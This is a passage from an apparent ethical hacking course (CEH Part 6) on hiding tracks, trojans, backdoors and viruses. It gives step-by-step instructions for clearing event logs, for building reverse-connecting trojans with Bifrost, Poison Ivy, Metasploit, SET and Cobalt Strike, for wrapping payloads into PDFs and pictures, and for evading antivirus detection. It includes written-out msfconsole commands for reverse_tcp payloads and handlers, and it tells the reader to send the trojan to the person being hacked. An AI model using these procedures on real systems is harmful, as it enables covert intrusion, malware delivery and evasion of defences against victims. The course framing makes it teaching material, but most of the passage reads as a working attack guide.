   ![](image-2g3tcblt.jpg)  You can use spyanywhere     ![](image-9g4uvv63.jpg)  They are some programs or tools that enables us to keep the root privileges and hide all process you make. Kits means the group of tools that allow you to control the computer. There is application rootkit and kernel rootkit. The application rootkit can control some applications and commands like ls and dir. They can hide the processes in the background and can control the ports and hide them. The kernel rootkits are the most dangerous rootkits and we need to change the operating system if it was infected with kernel rootkits. It infects the kernel of the machine.     ![](image-mkfpawlz.jpg)  ![](image-vrra9b3l.jpg)  We can hide the file through the attrib command that can change the properties of the file.    

Create file 1.txt in the c: and use the command attrib +h to change its attribute and hide the file.     

![](image-p3ok4jr6.jpg)  We can hide files in the ntfs drive through the ntfs stream property.    Use the following command to create a file test.txt and hide it. Use the same command to open it.    ![](image-arwveol4.jpg)  ![](image-n9u35uvz.jpg)  To hide files in linux put . in the beginning of the file name. To show hidden files press ctrl h, or go to menu, press view, show hidden file.      

![](image-9aey28fx.jpg)  ![](image-qhd7vyhb.jpg)  Go to event viewer     

![](image-9qv7wrzb.jpg)  Wavtutil.exe can be used to control the loga in the machine.  We can clear all logs by this tool  Use the script  in the CD which will clear all logs. Run the file, it will clear all logs.     ![](image-9r8dzvoy.jpg)  We can disable auditing policy.     ![](image-4pfjksfe.jpg)  We can work through the proxy server or the vpn connection to hide the real ip.  We can also work through vps server.  

  Part 6: Trojens and Backdoors and Viruses    Part 6 of Certified Ethical Hacker (CEH) Course    By    Dr. Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com    

  Part 6: Trojens and Backdoors and Viruses    a) Backdoors    

![](image-14tobn8j.jpg)  The backdoor is the backdoor that through it we can make access on the machine and we can make bypass to the existing security policies. Microsoft has a backdoors that enables it to make remote access on the machine.    b) Torjen Horse:    ![](image-3cly34nc.jpg)

  Trojen horse is a good program that carries bad program. When the client download the good program, it will download with it the trojen program also so the hacker can access the machine.    c) Overt channel and Covert Channel:    ![](image-smaxbz3a.jpg)  The overt channel means that any program when run makes for it channel between it and the system. The covert channel means that the program will use the channel in the wrong direction to access the machine.    

d) Different Types of Torjens:    ![](image-j081gv47.jpg)  e) How Do Reverse Connecting Torjans work :    

Trojan program in the hacker computer which creates server that installed in the client computer. In the reverse connection technique, the server on the client computer will make connection to the Trojan program on the hacker machine. We have problem that the hacker needs constant real ip that does not    ![](image-6ddu6tjw.jpg)  Windows Torjans Tools are Biforst and Poison Ivy  We must make port forward and dynamic dns. Go to basics then nat in the router configuration website. Choose the start and end port number and the internal ip of the hacker computer. We need to make the ip of the hacker computer static and same as the ip in the router configuration. It means if the router will come to the real ip of the router at port 81, it must forward the hacker computer with the internal ip 192.168.1.150 at port 81\.  

The problem that the real ip of the router not constant and changing. One solution that we buy real ip. To buy real ip, we need to have phone line registered for the hacker. So better solution is to register for dynamic domain name in dynamic dns server. This domain name will point to the real ip of the router. If the real ip changes, the router will change the data in the dynamic dns server.  The client Trojan will make connection with the dynamic dns server and it tell him the real ip of the router. So the Trojan makes the connection to the router at the port given in the Trojan program and the router will make port forward to the hacker computer.      ![](image-gtyyrulj.jpg)  

The site no-ip.com can provide dynamic dns. Register, then choose add host.   Download and setup the no-ip program at hacker computer.     ![](image-pf5tzvq7.jpg)  ![](image-xug38814.jpg)  You can utilize a property in routers called dynamic dns    

  ![](image-7yeudsd3.jpg)  Register for account in dyndns.com and put the registration information in the router configuration. When the router restarts, it will register its ip in dynamic dns.  We can use VPS machine. VPS will have real IP and it is  adevice connected directly to internet and we put through it Trojan program. The Trojan server in the client will make reverse connection to this real IP so the real IP will not change and VPS up in 24hrs.     f) Windows Torjan Tools :    ![](image-noesx35r.jpg)  Download bifrost. The bifrost has small size and accept encryption in many ways. Make registration.  Make the port forward at the router.     ![](image-c2xwnpjv.jpg)  Then go bifrost stub customizer and generate the trojan with the following sittings. The file generated will be Customized.     ![](image-5ydz648w.jpg)  Open the program bifrost. Put the dynamic dns name and the port number the Trojan program will work.     ![](image-k4neueqa.jpg)  ![](image-e8c2wgdf.jpg)  We put the customize file in the machine we want to attack and we can browse the machine     

![](image-sh80yhsl.jpg)  Build the program. Give him the file output of the customizer Customized.  

Send the file to the client you want to hack.  When the client access the Trojan file, we will get notice of reverse connection     ![](image-iybjzmmo.jpg)  Choose file manager on the machine you received     ![](image-caqq56ez.jpg)  Another program is Poison program     ![](image-4z1q1k60.jpg)  Choose new client. The Trojan  program listens on Put the password for the reverse connection if you wish.   The new server creates profile and name it server after you generate it. Choose the reverse connection to come to the host name at the dynamic dns server.     ![](image-326dr071.jpg)  

When the client click on server, we can see all information     ![](image-zh9pos9e.jpg)  Generate it and name it server.  When the client access the file, we get in the hacker client application the following     ![](image-m4radb8a.jpg)\\  ![](image-l5buldua.jpg)  g) Linux Torjan Tools :    ![](image-lvpuhbwm.jpg)  

VPS is a machine that has real ip address. We can connect on it in Windows from remote disktop and in Linux from SSH or through VNC program or through Cpanel of the company you bought from it the VPS .      ![](image-r9n1jk66.jpg)  h) Installing Metasploit :    

Download Metasoloit. You will get the following file.     ![](image-rd3ubxpz.jpg)  Give the file excusable permission to be excutable. Then run the file.     ![](image-3yc8vxia.jpg)  Setup the program. Leave the default information  To make update, you need to make registration. You need to access the metasploit through the web browser Fill the information    

  ![](image-al7sytl1.jpg)  Tell him to choose the pro metasploit standard edition. Give him the necessary information     ![](image-jn2yx663.jpg)  You will get license key in email and you will put it in the metasploit activation.  You will get the following interface     

![](image-5josxyuc.jpg)  Update the metasplot.    #msfupdate    i) Generating Payloads in Metasploit :    ![](image-1ofe3rwm.jpg)  The payload is program that through it we can utilise vulnerability on some software so we can access the machine. Metasploit has big number of payload for different types of operating systems and programs.    To see all types of payloads    \# msfconsole  

  Msf> search payloads    We want to create palyload that will work in windows machine and its type will be shell code and will use the property reverse connection    Msf> search payload/windows/shell    Msf> use payload/windows/shell/reverse\_tcp    Msf> set LHOST 192.168.52.130  (The ip of hacker machine)    Msf> generate –f  server –t exe    It will create server.exe in the root  

  Use the multi handler to listen for the payload.    Msf \> back    Msf> use exploit/multi/handler    Msf>set payload windows/shell/reverse\_tcp    Msf> set LHOST 192.168.52.130  (the hacker ip)    Msf> set LPORT 4444    Msf> exploit –j    Msf \> sessions –l  (to see the sessions)  

  Msf \> sessions –i  2    You can do anything in machine     ![](image-g2vjrpbi.jpg)  You can create the payload directly     ![](image-jl9kko5l.jpg)  You can use the set tool to create payloads. It works with metasploite.    Go applications, exploitation tools, social engineering tools, social engineering toolkit, set    Set> ./set-update    Set \> se\_toolkit    Press 1 for social engineering attacks.    ![](image-x257b08l.jpg)

  Press 4 for create a payload and listner    ![](image-zynm48mp.jpg)  Then, you put the IP of the hacker computer that will listen to the payload.    Choose 1 for the payload windows/shell/reverse\_tcp payload    Chose to use encoding    Choose to listen at port 4444    ![](image-z7xk35hp.jpg)  

It will ask you if you want to operate the listener, tell him yes.     You can find the payloads in pentest /exploits/set/msf.exe  Run the payload at client computer. The shell code sessions will appear at the hacker computer.    Set \> sessions –l  (to see the sessions)    Set \> sessions –i  1    

j) Wrapping:    It is to merge the program with picture wso that the client will not suspect the Trojan.    ![](image-07chnpi0.jpg)  ![](image-5k81cqy1.jpg)  In Bifrost create server.  Use the unicast sfx compiler to merge the torjan and a picture     ![](image-s22ttjwy.jpg)  

You can use kabo icon changer to change the icon     ![](image-zkbc4r3z.jpg)  You can use also winrar or iexpress     

k) Wrapping by Metasploit:    ![](image-8w1g18rw.jpg)  We use the following exploit:    

  ![](image-1swl5gwj.jpg)  Generate the payload in msfconsole. Give the LHOST the hacker computer dns name, the LPORT we want the Trojan program to listen, the file name, the pdf file we want to merge with the payload.     

  ![](image-6q2qwtbw.jpg)  Run the muti handler. Give it the payload information. Infect the client with the pdf file and you will enter meterpreter session.     

![](image-zqew6c1z.jpg)  ![](image-ra2wn000.jpg)

  Wrapping by Set Tools:    

#./se-toolkit    Choose 1 for social engineering attack.     ![](image-u2foiulu.jpg)  Choose 3 for infection media generator.     ![](image-873t64hn.jpg)  Choose 1 for file-format exploits.     ![](image-9sc7c72k.jpg)  

Put the IP that the payload uses for the reverse connection.  Choose 11 for embedded pdf  exe social engineering.     ![](image-dexo2ebf.jpg)  Choose the type of payload to be 2, windows meterpreter reverse\_tcp.     ![](image-6uj172v9.jpg)  Put the Ip of the listner and the port number.     ![](image-1e136bc9.jpg)  You will find the file in /root/pentest/exploits/set/autorun/template.pdf and therer is autorun.inf file.  Take the file in client computer and run it. The meterpreter session will open.  

   ![](image-2jkpak8e.jpg)  l) Wrapping Using Linux:    

The coalt strike is better than armitage in the point that it can do wrapping.     ![](image-d0bpin1l.jpg)  ![](image-w97lowlw.jpg)  Generate exe file. Search for windows/meterpreter/reverse\_tcp payload. Put the ip and port no of the listener. Generate the exe file.     ![](image-o1t1tr3d.jpg)  ![](image-amle6d0q.jpg)

  To work in multi handler, choose the same payload and put the same ip and port no of the listener. Choose the output to be multi handler.     ![](image-0jqms4oy.jpg)  To merge with pdf file, go menu, attacks, packages, adobe pdf. Choose the pdf file and the server file.     ![](image-486m57ve.jpg)

  When you run the infected file in the client machine you will see it     ![](image-ekms061o.jpg)  m) Encoding the Torjan so the anti-virus will not detect it:    ![](image-mjukbgje.jpg)  The antivirus program when wants to detect any virus or malware or Trojan, it can work though two ways, signature based or behavioral based. The anti virus program has a database that has a lot of codes and when it finds the code in the file it scans, it will know that it is Trojan with some name or virus with some name. The behavioral based can see the behavior of the program when it run. From the behavior of the progrman it can detect whether it is virus or Trojan. Most programs works as signature based and some works as behavioral based.   There are some sites that have muti engine virus scan that can scan any file with many anti viruses. Virustotal.com can scan with 46 engines.     ![](image-xfuc21gd.jpg)  You can encrypt the Trojan and scan it in virustotal.com, but that make the antiviruses detect your Trojan from virustotal.com.  Encode the program customized.exe  with xencode program.  

   ![](image-sx4fad84.jpg)  You can encrypt the file using hex workshop program. Search by trial error the  part that has virus signature and change a letter on it so the file will not be detected by antivirus.      

n) Encoding in Metasploit    ![](image-ttsiyac4.jpg)  Metasploit has some encoders that we can use when we generate the payload.  To see the encoders in metasploit, type    \# msfconsole    Msf> use payload/windows/meterpreter/reverse\_tcp    Msf> show encoders    

The best is x86/shikata\_ga\_ni. Generate the payload with this encoder    MSf> generate –t exe –f Mahmoud –e x86/shikata\_ga\_ni    ![](image-58zcwzbq.jpg)  Download armitage    #apt-get install armitage    Start the sql services    #service postgresql start    Start armitage  

Go windows then meterpreter then reverse\_tcp We choose the encoder and LHOST and LPORT and they are the IP address and port of the hacker machine listening to payload. Choose the output file to be exe file.     ![](image-sit7ido7.jpg)  Scan the file in virustotal> You will see it was detected by 35 antivirus    

  ![](image-vkb73vnx.jpg)  We can use AVOID script for encryption. We need first to install mingw32 first. Run the shell and provide him with necessary information, and you will get the Trojan in autorun folder     ![](image-1onp6whf.jpg)  ![](image-gqlxtje5.jpg)  ![](image-v33jrlo9.jpg)

  When we scan the file, we found it was detected by 16 from 46 anti-viruses.     n) Viruses and Warms  

  Virus     ![](image-hqbtssum.jpg)

  Worm     ![](image-bmdgerdr.jpg)  Types of Viruses     ![](image-7hyprsfv.jpg)  Some Tools to make worms and viruses     ![](image-rxb7cjr4.jpg)  JPS Virus Maker     ![](image-dcckxl7d.jpg)